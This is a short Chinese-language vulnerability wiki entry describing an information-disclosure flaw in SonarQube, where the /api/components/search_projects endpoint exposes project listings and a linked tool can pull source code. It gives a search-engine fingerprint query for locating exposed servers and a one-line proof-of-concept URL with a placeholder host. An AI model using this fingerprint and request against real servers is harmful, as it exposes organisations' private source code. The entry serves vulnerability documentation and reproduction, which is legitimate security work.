---
title: "SonarQube search_projects 项目信息泄露漏洞"
date: 2026-10-16 09:09:19
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "SonarQube-search_projects"
tags:
  - "SonarQube-search_projects"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

SonarQube 某接口存在信息泄露漏洞，可以通过工具下载源码

## 漏洞影响

```
SonarQube
```

## 网络测绘

```
app="sonarQube-代码管理"
```

## 漏洞复现

主页如下



![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101932489.png)



漏洞POC



```plain
http://xxx.xxx.xxx.xxx/api/components/search_projects
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101932452.png)

可通过工具下载项目中的源代码 



https://github.com/deletescape/sloot

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101932586.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/SonarQube-search_projects-%E9%A1%B9%E7%9B%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
